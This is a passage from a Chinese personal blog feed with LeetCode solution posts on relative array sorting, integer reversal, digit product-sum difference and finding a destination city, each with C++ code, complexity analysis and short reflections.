<p>此外，由于题目中给定的元素都是正数，因此我们可以用 $\textit{rank}[x]-n$ 和 $x$分别代替 $(0, \textit{rank}[x])$ 和 $(1, x)$，其中 $n$ 是数组 $\textit{arr}_2$的长度（同时也是哈希表 $\textit{rank}$ 的大小）。这样做的正确性在于，$\textit{rank}[x]-n$一定是负数，而 $x$ 一定是正数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">relativeSortArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr1, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr2)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; rank;</span><br><span class="line">        <span class="keyword">int</span> n = arr2.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            rank[arr2[i]] = i - n;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(arr1.begin(), arr1.end(), [&amp;](<span class="keyword">int</span> x, <span class="keyword">int</span> y) &#123;</span><br><span class="line">            <span class="keyword">return</span> (rank.count(x) ? rank[x] : x) &lt; (rank.count(y) ? rank[y] : y);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> arr1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(m \log m + n)$，其中 $m$ 和 $n$ 分别是数组 $\textit{arr}_1$ 和 $\textit{arr}_2$ 的长度。构造哈希表 $\textit{rank}$ 的时间复杂度为 $O(n)$，排序的时间复杂度为 $O(m \log m)$。</p>
</li>
<li><p>空间复杂度：$O(\log m + n)$，哈希表 $\textit{rank}$需要的空间为 $O(n)$，排序需要的栈空间为 $O(\log m)$</p>
</li>
</ul>
<p><strong>方法二：计数排序</strong></p>
<p><strong>思路与算法</strong></p>
<p>注意到本题中元素的范围为 $[0, 1000]$，这个范围不是很大，我们也可以考虑不基于比较的排序，例如「计数排序」。</p>
<p>具体地，我们使用一个长度为 $1001$（下标从 $0$ 到 $1000$）的数组 $\textit{frequency}$，记录每一个元素在数组  中出现的次数。随后我们遍历数组 $\textit{arr}_2$ ，当遍历到元素 $x$ 时，我们将 $\textit{frequency}[x]$个 $x$ 加入答案中，并将 $\textit{frequency}[x]$清零。当遍历结束后，所有在 $\textit{arr}_2$中出现过的元素就已经有序了。</p>
<p>此时还剩下没有在 $\textit{arr}_2$中出现过的元素，因此我们还需要对整个数组 $\textit{frequency}$进行一次遍历。当遍历到元素 $x$时，如果 $\textit{frequency}[x]$不为 00，我们就将 $\textit{frequency}[x]$个 $x$加入答案中。</p>
<p><strong>细节</strong></p>
<p>我们可以对空间复杂度进行一个小优化。实际上，我们不需要使用长度为 $1001$ 的数组，而是可以找出数组 $\textit{arr}_1$ 中的最大值 $\textit{upper}$，使用长度为 $\textit{upper}+1$ 的数组即可。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗7.7M，击败51.63%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">relativeSortArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr1, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> upper = *max_element(arr1.begin(), arr1.end());</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">frequency</span><span class="params">(upper + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> x: arr1) &#123;</span><br><span class="line">            ++frequency[x];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> x: arr2) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; frequency[x]; ++i) &#123;</span><br><span class="line">                ans.push_back(x);</span><br><span class="line">            &#125;</span><br><span class="line">            frequency[x] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> x = <span class="number">0</span>; x &lt;= upper; ++x) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; frequency[x]; ++i) &#123;</span><br><span class="line">                ans.push_back(x);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(m + n + \textit{upper})$，其中 $m$ 和 $n$ 分别是数组 $\textit{arr}_1$ 和 $\textit{arr}_2$ 的长度，$\textit{upper}$是数组 $\textit{arr}_1$<br>中的最大值，在本题中 $\textit{upper}$不会超过 $1000$。遍历数组 $\textit{arr}_2$ 的时间复杂度为 $O(n)$，遍历数组 $\textit{frequency}$的时间复杂度为 $O(\textit{upper})$，而在遍历的过程中，我们一共需要 $O(m)$ 的时间得到答案数组。</li>
<li>空间复杂度：$O(\textit{upper})$，即为数组 $\textit{frequency}$ 需要使用的空间。注意到与方法一不同的是，方法二的代码使用了额外的空间（而不是直接覆盖数组 $\textit{arr}_1$ ）存放答案，但我们一般不将存储返回答案的数组计入空间复杂度，并且在我们得到数组 $\textit{frequency}$之后，实际上也是可以将返回答案覆盖在数组 $\textit{arr}_1$ 上的。如果在面试中遇到了本题，这些细节都可以和面试官进行确认。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>自定义排序容易想到吗？还是暴力解法比较香😎。可以学习自定义排序的思想，计数排序也遇到过好多次了，也是常用的解题方法。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>整数反转</title>
    <url>/2020/10/22/%E6%95%B4%E6%95%B0%E5%8F%8D%E8%BD%AC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/two-sum/">题目地址</a></strong></p>
<p><strong>题目名称：</strong>两数之和</p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给出一个32位的有符号整数，你需要将这个整数中每位上的数字进行反转。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：123</span><br><span class="line">输出：321</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：-123</span><br><span class="line">输出：-321</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：120</span><br><span class="line">输出：21</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<p>假设我们的环境只能存储得下32位的有符号整数，则其数值范围为[-2<sup>31</sup>,2<sup>31</sup>-1]。请根据这个假设，如果反转后整数溢出那么就返回0。</p>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p>下面是自己提交通过的代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>;<span class="comment">//i是整数x的10进制位数</span></span><br><span class="line">        <span class="keyword">long</span> rev=<span class="number">0</span>;<span class="comment">//一定要初始化，long类型8字节反转后不会超出范围</span></span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; values&#123;&#125;;<span class="comment">//存储10进制整数x的每一位</span></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            values.push_back(x%<span class="number">10</span>);<span class="comment">//3 2 1</span></span><br><span class="line">            x=x/<span class="number">10</span>;<span class="comment">//12 1 0</span></span><br><span class="line">        &#125;<span class="keyword">while</span>(x!=<span class="number">0</span>);</span><br><span class="line">        i=values.size();<span class="comment">//整数x的10进制位数</span></span><br><span class="line">        <span class="comment">//求反转后的数值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;i;k++)&#123;</span><br><span class="line">            rev+=values[k]*<span class="built_in">pow</span>(<span class="number">10</span>,i-k<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//反转后整数溢出</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(rev)&gt;<span class="number">2147483648</span>)&#123;</span><br><span class="line">            rev=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> rev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解："><a href="#官方题解：" class="headerlink" title="官方题解："></a>官方题解：</h6><p><strong>方法：弹出和推入数字 &amp; 溢出前进行检查</strong><br><strong>思路</strong></p>
<p>我们可以一次构建反转整数的一位数字。在这样做的时候，我们可以预先检查向原整数附加另一位数字是否会导致溢出。</p>
<p><strong>算法</strong></p>
<p>反转整数的方法可以与反转字符串进行类比。</p>
<p>我们想重复“弹出” xx 的最后一位数字，并将它“推入”到 rev 的后面。最后，rev将与x 相反。</p>
<p>要在没有辅助堆栈 / 数组的帮助下 “弹出” 和 “推入” 数字，我们可以使用数学方法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//pop operation:</span></span><br><span class="line">pop = x % <span class="number">10</span>;</span><br><span class="line">x /= <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//push operation:</span></span><br><span class="line">temp = rev * <span class="number">10</span> + pop;</span><br><span class="line">rev = temp;</span><br></pre></td></tr></table></figure>
<p>但是，这种方法很危险，因为当$temp=rev·10+pop$  时会导致溢出。</p>
<p>幸运的是，事先检查这个语句是否会导致溢出很容易。</p>
<p>为了便于解释，我们假设 rev 是正数。</p>
<ol>
<li>如果$temp=rev·10+pop$导致溢出，那么一定有$rev\geqq\frac{INTMAX}{10}$。</li>
<li>如果$rev\geqq\frac{INTMAX}{10}$，那么$temp=rev·10+pop$一定会溢出。</li>
<li>如果$rev\geqq\frac{INTMAX}{10}$，那么只要pop&gt;7，$temp=rev·10+pop$就会溢出。</li>
</ol>
<p>当rev为负时可以应用类似的逻辑。</p>
<p><strong>代码</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rev = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> pop = x % <span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span> (rev &gt; INT_MAX/<span class="number">10</span> || (rev == INT_MAX / <span class="number">10</span> &amp;&amp; pop &gt; <span class="number">7</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (rev &lt; INT_MIN/<span class="number">10</span> || (rev == INT_MIN / <span class="number">10</span> &amp;&amp; pop &lt; <span class="number">-8</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            rev = rev * <span class="number">10</span> + pop;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> rev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(log(x))$，x中大约有$ \log_{10}(x)$位数字。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<center>🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓知 识 点🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓</center>

<h6 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h6><p><strong>1、数据在计算机中的存储:</strong></p>
<p><strong>机器数：</strong>一个数在计算机中的表现形式叫做机器数，这个数有正负之分，在计算机中用一个数的最高位（符号位）表示它的正负，其中0表示正数，1表示负数。</p>
<p><strong>真数：</strong>计算机中的机器数对应的真实的值就是真数，对最高位（符号位）后面的二进制转换成10进制，并根据最高位来确定这个数的正负。</p>
<p><strong>原码：</strong>符号位加上真数的绝对值，第一位表示符号，其余位表示值。</p>
<p><strong>反码：</strong>正数的反码是其本身；负数的反码是在原码的基础上，符号位不变，其余各位取反。</p>
<p><strong>补码：</strong>正数的补码就是其本身；负数的补码是在其原码的基础上，符号位不变其余各位取反最后加1（即在反码的基础上加1）。</p>
<p><strong>2、问题</strong>：原码是被人脑直接识别并用于计算的表达方式，为何还会有反码和补码呢？？？👀</p>
<ul>
<li><p>人脑很容易可以知道第一位是符号位，而对于计算机而言，辨别“符号位”基础电路设计会变得十分复杂，于是人们考虑将符号位也参与运算并且只保留加法，减去一个数等于加上它的负数。</p>
</li>
<li><p>若用原码表示，让符号位也参与运算，能满足正数的加法，但无法满足负数的加法结果不正确。若用反码计算减法，会有[0000 0000]<sub>原</sub>、[1000 0000]<sub>原</sub>两个编码表示0。若用补码表示，可以用[0000 0000]<sub>原</sub>表示0，不但解决了0的两个编码问题，而且可以用[1000 0000]<sub>补</sub>表示-128，注意：因为实际上是使用以前-0的补码来表示，所以-128并没有原码和反码表示。</p>
</li>
<li>使用补码不仅修复了0的符号以及存在两个编码的问题且还能多表示一个最低数，这就是为什么8位二进制使用源码或反码表示的范围为[-127,+127]，而使用补码表示范围为[-128,127]。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>反转之后的整数，我是在do where循环外面利用for循累加起来的，没有想到在do where循环里面可以直接在弹出x数字的同时推入到反转整数的后面，又学到了，再接再厉吧😛。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>整数的各位积和之差</title>
    <url>/2020/11/09/%E6%95%B4%E6%95%B0%E7%9A%84%E5%90%84%E4%BD%8D%E7%A7%AF%E5%92%8C%E4%B9%8B%E5%B7%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/subtract-the-product-and-sum-of-digits-of-an-integer/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数 <code>n</code>，请你帮忙计算并返回该整数「各位数字之积」与「各位数字之和」的差。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 234</span><br><span class="line">输出：15 </span><br><span class="line">解释：</span><br><span class="line">各位数之积 &#x3D; 2 * 3 * 4 &#x3D; 24 </span><br><span class="line">各位数之和 &#x3D; 2 + 3 + 4 &#x3D; 9 </span><br><span class="line">结果 &#x3D; 24 - 9 &#x3D; 15</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[输入：n &#x3D; 4421</span><br><span class="line">输出：21</span><br><span class="line">解释： </span><br><span class="line">各位数之积 &#x3D; 4 * 4 * 2 * 1 &#x3D; 32 </span><br><span class="line">各位数之和 &#x3D; 4 + 4 + 2 + 1 &#x3D; 11 </span><br><span class="line">结果 &#x3D; 32 - 11 &#x3D; 21</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 10^5</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>while循环，每次得到整数的一位，计算各位数字之积和各位数字之和，返回它们的差。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.3M，击败5.12%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">subtractProductAndSum</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> mul=<span class="number">1</span>,sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n)&#123;</span><br><span class="line">            mul*=n%<span class="number">10</span>;</span><br><span class="line">            sum+=n%<span class="number">10</span>;</span><br><span class="line">            n=n/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> mul-sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/subtract-the-product-and-sum-of-digits-of-an-integer/solution/zheng-shu-de-ge-wei-ji-he-zhi-chai-by-leetcode-sol/">官方题解</a>:</h6><p><strong>方法一：模拟</strong></p>
<p>我们每次通过取模运算得到 <code>n</code> 的最后一位，依次进行乘法和加法运算，最后将得到的积 <code>mul</code> 以及和 <code>add</code> 相减即可得到答案。</p>
<p><strong>c++代码：</strong>（执行0ms，击败100.00%，内存6.2M，击败5.92%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">subtractProductAndSum</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> add = <span class="number">0</span>, mul = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> digit = n % <span class="number">10</span>;</span><br><span class="line">            n /= <span class="number">10</span>;</span><br><span class="line">            add += digit;</span><br><span class="line">            mul *= digit;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> mul - add;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<p>时间复杂度：$O(logN)$。整数 $N$ 的位数为$log_{10}(N + 1)$，根据换底公式，它和时间复杂度中常用的以 $2$为底的$log$ 只相差一个常数，因此可以表示为$O(logN)$。</p>
<p>空间复杂度：$O(1)$。</p>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>和官方题解思路相同，题目比较简单。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>旅行终点站</title>
    <url>/2020/11/10/%E6%97%85%E8%A1%8C%E7%BB%88%E7%82%B9%E7%AB%99/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/destination-city/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一份旅游线路图，该线路图中的旅行线路用数组 <code>paths</code> 表示，其中 <code>paths[i] = [cityAi, cityBi]</code> 表示该线路将会从 <code>cityAi</code> 直接前往 <code>cityBi</code> 。请你找出这次旅行的终点站，即没有任何可以通往其他城市的线路的城市。</p>
<p>题目数据保证线路图会形成一条不存在循环的线路，因此只会有一个旅行终点站。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：paths &#x3D; [[&quot;London&quot;,&quot;New York&quot;],[&quot;New York&quot;,&quot;Lima&quot;],[&quot;Lima&quot;,&quot;Sao Paulo&quot;]]</span><br><span class="line">输出：&quot;Sao Paulo&quot; </span><br><span class="line">解释：从 &quot;London&quot; 出发，最后抵达终点站 &quot;Sao Paulo&quot; 。本次旅行的路线是 &quot;London&quot; -&gt; &quot;New York&quot; -&gt; &quot;Lima&quot; -&gt; &quot;Sao Paulo&quot; 。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：paths &#x3D; [[&quot;B&quot;,&quot;C&quot;],[&quot;D&quot;,&quot;B&quot;],[&quot;C&quot;,&quot;A&quot;]]</span><br><span class="line">输出：&quot;A&quot;</span><br><span class="line">解释：所有可能的线路是：</span><br><span class="line">&quot;D&quot; -&gt; &quot;B&quot; -&gt; &quot;C&quot; -&gt; &quot;A&quot;. </span><br><span class="line">&quot;B&quot; -&gt; &quot;C&quot; -&gt; &quot;A&quot;. </span><br><span class="line">&quot;C&quot; -&gt; &quot;A&quot;. </span><br><span class="line">&quot;A&quot;. </span><br><span class="line">显然，旅行终点站是 &quot;A&quot; 。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：paths &#x3D; [[&quot;A&quot;,&quot;Z&quot;]]</span><br><span class="line">输出：&quot;Z&quot;</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= paths.length &lt;= 100</code></li>
<li><code>paths[i].length == 2</code></li>
<li><code>1 &lt;= cityAi.length, cityBi.length &lt;= 10</code></li>
<li><code>cityAi != cityBi</code></li>
<li>所有字符串均由大小写英文字母和空格字符组成。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>每个paths[i]的第一个元素是出发站，第二个是终点站。旅行的终点站也就是没有通往其他城市的路线。也就是说只要找第二个位置出现过而在第一个位置没出现过的城市。</p>
<p>双层for循环遍历，对每一条路线的到达站遍历所有的线路是否作为过出发站。</p>
<p><strong>c++代码：</strong>(执行用时24ms，击败92.48%，内存消耗10.1M，击败89.27%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">destCity</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&gt;&amp; paths)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=paths.size();</span><br><span class="line">        <span class="built_in">string</span> result=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">//对每一条路线的到达站进行遍历判断是否是终点站</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="comment">//默认为true，不是终点站再改为false</span></span><br><span class="line">            <span class="keyword">bool</span> flag=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(paths[i][<span class="number">1</span>]==paths[j][<span class="number">0</span>])&#123;</span><br><span class="line">                    <span class="comment">//不是终点站</span></span><br><span class="line">                    flag=<span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                result=paths[i][<span class="number">1</span>];</span><br><span class="line">                <span class="comment">//只有一个旅行终点站，找到后终止循环</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，不过我这个代码效率也挺高了，对双百最接近的一次，哈哈哈😁</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>替换空格</title>
    <url>/2020/11/13/%E6%9B%BF%E6%8D%A2%E7%A9%BA%E6%A0%BC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/ti-huan-kong-ge-lcof/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
